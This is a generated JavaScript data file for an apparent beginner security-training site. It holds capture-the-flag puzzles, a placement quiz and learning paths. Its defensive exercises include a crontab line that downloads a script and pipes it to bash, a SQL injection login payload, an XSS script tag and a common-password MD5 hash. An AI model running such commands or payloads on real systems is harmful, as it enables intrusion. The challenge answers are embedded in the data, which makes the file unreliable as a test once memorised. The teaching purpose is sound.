// pro.js data (generated). Flags are stored as SHA-256 hashes, so they are not readable in the source.
window.SWD={
"packs": [
{
"id": "warm",
"name": "Terminal Warm-up",
"ic": "🔰",
"lvl": "Easy",
"d": "Five short puzzles on encodings, permissions and logs.",
"cs": [
{
"id": "w1",
"t": "Not encryption",
"pts": 20,
"story": "A coworker left a note on the shared drive and says it is encrypted.",
"data": "U1d7YmFzZTY0X2lzX25vdF9lbmNyeXB0aW9ufQ==",
"q": "Decode the text. It ends with == which is a hint at the format. The flag looks like SW{...}.",
"hints": [
"This format turns bytes into letters, numbers, + and /.",
"The lab terminal has a base64 command. Try base64 -d."
],
"h": "8ecdf84ce6bcd620476cbc6b1469610e105ba1ea6ed1283b584168793488a749"
},
{
"id": "w2",
"t": "Caesar would be proud",
"pts": 20,
"story": "A message was passed around in a simple letter-shifting cipher.",
"data": "FJ{pnrfne_jbhyq_or_cebhq}",
"q": "Every letter was moved 13 places along the alphabet. Undo it to get the flag.",
"hints": [
"ROT13 is its own inverse: apply it again.",
"The letters S and W became F and J."
],
"h": "762a1900deb5ea8c2b9cd07af8c7d060f4f8e3ddd296b83ad280f2b8ce4fbb5a"
},
{
"id": "w3",
"t": "Just bytes",
"pts": 25,
"story": "A debug dump shows the bytes of a secret as hexadecimal.",
"data": "53 57 7b 68 65 78 5f 69 73 5f 6a 75 73 74 5f 62 79 74 65 73 7d",
"q": "Each pair of hex digits is one ASCII character. Convert them back to text.",
"hints": [
"53 is the ASCII code for S.",
"xxd -r -p turns hex back into text."
],
"h": "f5c42977ef5a6b396a6b72fe8c14d3dd67d5983cdeaa6d7d99ceb7296c04b756"
},
{
"id": "w4",
"t": "Who can run it?",
"pts": 25,
"story": "Here is a directory listing from a shared server.",
"data": "-rw-r--r-- 1 ann  devs  1204 Oct  3 09:12 notes.txt\n-rwxr-x--- 1 root devs   220 Oct  3 09:15 secret.sh\ndrwxr-xr-x 2 ann  devs  4096 Oct  3 09:10 backups",
"q": "What is the octal permission mode of secret.sh? The flag is SW{mode}, for example SW{644}.",
"hints": [
"r is 4, w is 2, x is 1. Add them per group: owner, group, others.",
"Owner rwx = 7, group r-x = 5, others --- = 0."
],
"h": "4a909167b45c425481673149717828231eea6849e67657b5b10b8fbb94765888"
},
{
"id": "w5",
"t": "Noisy neighbour",
"pts": 30,
"story": "The SSH log of a server that someone is hammering.",
"data": "Oct  3 02:14:07 kali sshd[1021]: Failed password for root from 203.0.113.45 port 40122 ssh2\nOct  3 02:14:09 kali sshd[1023]: Failed password for root from 198.51.100.7 port 51200 ssh2\nOct  3 02:14:11 kali sshd[1025]: Failed password for admin from 203.0.113.45 port 40130 ssh2\nOct  3 02:14:14 kali sshd[1027]: Failed password for root from 203.0.113.45 port 40141 ssh2\nOct  3 02:14:20 kali sshd[1030]: Accepted password for ann from 192.0.2.10 port 33012 ssh2\nOct  3 02:14:22 kali sshd[1032]: Failed password for test from 198.51.100.7 port 51214 ssh2\nOct  3 02:14:25 kali sshd[1034]: Failed password for root from 203.0.113.45 port 40160 ssh2\nOct  3 02:14:31 kali sshd[1036]: Failed password for guest from 192.0.2.99 port 60001 ssh2",
"q": "Which IP address has the most failed password attempts? The flag is SW{ip}.",
"hints": [
"Count the lines that say Failed password, grouped by the IP after from.",
"grep Failed auth.log | awk '{print $11}' | sort | uniq -c would do it on a real server."
],
"h": "d4a9fd7ce399cbc394b072ac699645f15a3811b2efa474208c5a1bfb2d82d8fe"
}
]
},
{
"id": "web",
"name": "Web and Network Defender",
"ic": "🌐",
"lvl": "Medium",
"d": "Spot attacks in web traffic, scans and phishing emails.",
"cs": [
{
"id": "n1",
"t": "The odd request",
"pts": 30,
"story": "The web server log shows six requests. One of them is a SQL injection, and one is a decoy.",
"data": "#1  GET  /products?id=12\n#2  GET  /products?id=14\n#3  GET  /search?q=laptop\n#4  POST /login        user=admin' OR '1'='1'--&pass=x\n#5  GET  /search?q=<script>alert(1)</script>\n#6  GET  /about",
"q": "Which request number is the SQL injection? The flag is SW{req_N}.",
"hints": [
"SQL injection tries to change the database query with quotes and OR conditions.",
"The script tag is cross-site scripting, a different attack."
],
"h": "8d4e1308ab24658d4cd78fe146e1d35723ce5db7045f8d39a1bea5832ce8125c"
},
{
"id": "n2",
"t": "Exposed",
"pts": 30,
"story": "A scan of a public web server.",
"data": "PORT      STATE  SERVICE\n22/tcp    open   ssh\n80/tcp    open   http\n443/tcp   open   https\n3306/tcp  open   mysql",
"q": "A public web server should expose only SSH, HTTP and HTTPS. Which open port should not be reachable from the internet? The flag is SW{port}.",
"hints": [
"Look at the service column.",
"Databases should stay on the internal network."
],
"h": "03cb4126bf3152ddd2e710351699106a3d48ec8bfd6681eabd87ded5d20db541"
},
{
"id": "n3",
"t": "Cookie jar",
"pts": 35,
"story": "The site stores a login cookie in your browser. It looks like gibberish.",
"data": "eyJ1c2VyIjoiYW5uIiwicm9sZSI6InVzZXIifQ==",
"q": "Decode the cookie. The flag is SW{role_username} using the values you find inside.",
"hints": [
"It is base64 again, and the result is JSON.",
"The JSON has two fields: user and role."
],
"h": "b26833d38f23dce8085a9d92180bc281b67b5091c4aa55b096b0b789df78ee37"
},
{
"id": "n4",
"t": "Where does it really go?",
"pts": 35,
"story": "An email claims to be from a payment company.",
"data": "From:    PayPal Support <help@paypal-support-team.info>\nSubject: Your account is limited\nButton:  [ Log in to PayPal ]\nShows:   https://www.paypal.com/login\nOpens:   http://paypal-secure-login.example-verify.net/login",
"q": "What is the real registered domain the button opens? The flag is SW{domain}.",
"hints": [
"Ignore the text the email shows. Look at where the link opens.",
"The registered domain is the last two parts before the first slash, like example.com."
],
"h": "5fae5dba3c320fbd37a63c805f24b80fecc1fe0fe3f19d0c3adfd548d91eb3f7"
},
{
"id": "n5",
"t": "Weak by choice",
"pts": 40,
"story": "A leaked database contains this unsalted MD5 password hash.",
"data": "0d107d09f5bbe40cade3de5c71e9e9b7",
"q": "The password is one of the most common ones people choose when they want to get in quickly. Find it. The flag is SW{password}.",
"hints": [
"It is a 7 letter phrase asking to be let in.",
"Attackers check hashes against lists of common passwords, so a short common word falls in seconds."
],
"h": "42c5d66b0fdcb98e108683eb120f5e30397c060c6bcc57befe5e20e30406d247"
}
]
},
{
"id": "soc",
"name": "SOC Analyst Lab",
"ic": "🛡️",
"lvl": "Hard",
"d": "Investigate an intrusion from the first failed login to the cleanup.",
"cs": [
{
"id": "s1",
"t": "Door forced",
"pts": 40,
"story": "Log lines from the SSH service.",
"data": "09:01:12 sshd: Failed password for deploy from 198.51.100.23\n09:01:15 sshd: Failed password for deploy from 198.51.100.23\n09:01:18 sshd: Failed password for deploy from 198.51.100.23\n09:01:22 sshd: Failed password for deploy from 198.51.100.23\n09:01:26 sshd: Accepted password for deploy from 198.51.100.23\n09:01:40 sshd: Accepted password for ann from 192.0.2.10\n09:03:02 systemd: Started session 14 of user deploy",
"q": "Which account was compromised, and from which IP? The flag is SW{account_ip}.",
"hints": [
"Look for failures followed by an Accepted line for the same account and IP.",
"Ann logged in from her usual address with no failures."
],
"h": "fabea456e021e66591c472e1444799d2a9d1845382bb02436fd0716536a011bc"
},
{
"id": "s2",
"t": "What left the building",
"pts": 40,
"story": "A web server access log. The last column is bytes sent.",
"data": "203.0.113.9    GET /css/site.css        200      8200\n10.0.0.5       GET /backup/db.sql       200  52428800\n198.51.100.77  GET /backup/customers.zip 200 98304000\n203.0.113.9    GET /index.html          200      5120\n198.51.100.77  GET /robots.txt          200       120",
"q": "Which EXTERNAL IP downloaded the largest amount of data? Internal addresses start with 10. The flag is SW{ip}.",
"hints": [
"Ignore the 10.x.x.x address, it is inside the network.",
"One external address pulled a file of about 98 MB."
],
"h": "fb07838e20b85705f776428223b3922cc0c529957bee17b36a166dad7f3eb4c3"
},
{
"id": "s3",
"t": "Staying power",
"pts": 45,
"story": "The crontab of a server after an alert.",
"data": "1  0 3 * * *    /usr/local/bin/backup.sh\n2  */15 * * * * /usr/bin/php /var/www/cron.php\n3  * * * * *    curl -s http://203.0.113.200/x.sh | bash\n4  30 6 * * 1   /usr/sbin/logrotate /etc/logrotate.conf",
"q": "Which line is the persistence mechanism an attacker would plant? The flag is SW{lineN}.",
"hints": [
"One job runs every minute and pipes a download into a shell.",
"Legitimate jobs run local scripts and have sensible schedules."
],
"h": "49557e058ee3e82a1d63e5029c3f8284db9c3cb54c3aacf9c7d9742422bdb5ed"
},
{
"id": "s4",
"t": "Clock watching",
"pts": 45,
"story": "A timeline built from several logs.",
"data": "14:02  Failed login for ann from 198.51.100.5\n14:05  Failed login for ann from 198.51.100.5\n14:09  Accepted login for ann from 198.51.100.5\n14:21  ann ran: sudo su - (became root)\n14:24  New user \"support2\" created",
"q": "How many minutes passed between the first failed login and the moment ann became root? The flag is SW{minutes}.",
"hints": [
"Subtract 14:02 from 14:21."
],
"h": "0ba03b5339751e0712e5ca7e96e852b1079502a40e067ab723c56c1df896092f"
},
{
"id": "s5",
"t": "Layers",
"pts": 55,
"story": "An attacker hid a message in two layers of encoding. First the text was turned into base64, then every character of that was written as hex.",
"data": "55 31 64 37 62 47 46 35 5a 58 4a 7a 58 32 78 70 61 32 56 66 59 57 35 66 62 32 35 70 62 32 35 39",
"q": "Undo both layers to get the flag.",
"hints": [
"Start with hex to text. The result will end with an equals sign or two.",
"Then decode that text as base64."
],
"h": "b088bd21ffe586415a38017823a6aadcaeb364908771da4300b9e1d8be808cbb"
}
]
}
],
"place": [
[
"basics",
"Which command shows the directory you are in?",
"pwd",
"ls",
"cd"
],
[
"basics",
"Which command lists hidden files too?",
"ls -a",
"ls -h",
"ls -x"
],
[
"basics",
"What does cat notes.txt do?",
"Prints the contents of the file",
"Deletes the file",
"Renames the file"
],
[
"basics",
"Which command removes a file?",
"rm",
"mv",
"cd"
],
[
"inter",
"What does the pipe | do in: ls | wc -l ?",
"Sends the output of the first command to the second",
"Saves the output to a file",
"Runs the second command only if the first fails"
],
[
"inter",
"What does chmod 600 file mean?",
"Owner can read and write, nobody else has access",
"Everyone can read and write",
"Only the owner can run it"
],
[
"inter",
"Which command finds lines containing the word error in a file?",
"grep error file",
"find error file",
"ls error file"
],
[
"inter",
"What does >> do in: echo hi >> log.txt ?",
"Appends the text to the file",
"Overwrites the file with the text",
"Reads the text from the file"
],
[
"sec",
"What does a hash such as SHA-256 give you?",
"A fixed-size fingerprint that cannot be reversed",
"An encrypted copy you can unlock with a key",
"A smaller copy of the file"
],
[
"sec",
"Dozens of failed SSH logins from one IP in a few seconds most likely mean what?",
"A brute-force attack",
"A software update",
"A normal backup"
],
[
"sec",
"Which port does HTTPS use by default?",
"443",
"80",
"22"
],
[
"sec",
"Why is it risky to run everything as root?",
"One mistake or piece of malware gets full control of the system",
"Root is much slower",
"Root cannot use the network"
]
],
"paths": [
{
"id": "foundations",
"name": "Linux Foundations",
"ic": "🌱",
"lvl": "Beginner",
"d": "Move around, read and make files, and finish your first ten modules.",
"m": [
0,
1,
2,
3,
4,
5,
6,
7,
8,
9
]
},
{
"id": "power",
"name": "Command-Line Power User",
"ic": "⚡",
"lvl": "Intermediate",
"d": "Pipes, text tools, scripts, loops and archives. Work faster in the shell.",
"m": [
10,
11,
13,
17,
21,
22,
32,
33,
38,
43
]
},
{
"id": "sysadmin",
"name": "Linux Administrator",
"ic": "🧰",
"lvl": "Intermediate",
"d": "Users, services, disks, packages and scheduled jobs.",
"m": [
12,
18,
19,
20,
34,
35,
45,
46,
47,
48
]
},
{
"id": "soc",
"name": "SOC Analyst Starter",
"ic": "🛡️",
"lvl": "Intermediate",
"d": "Read logs, track processes and ports, and spot the signs of an intrusion.",
"m": [
7,
8,
12,
14,
18,
19,
23,
24,
27,
36
]
},
{
"id": "pentest",
"name": "Penetration Tester Starter",
"ic": "🎯",
"lvl": "Advanced",
"d": "Network tools, hashes, privilege, routes, DNS and hunting for weak spots.",
"m": [
8,
14,
15,
16,
24,
25,
26,
27,
49,
50
]
}
]
};
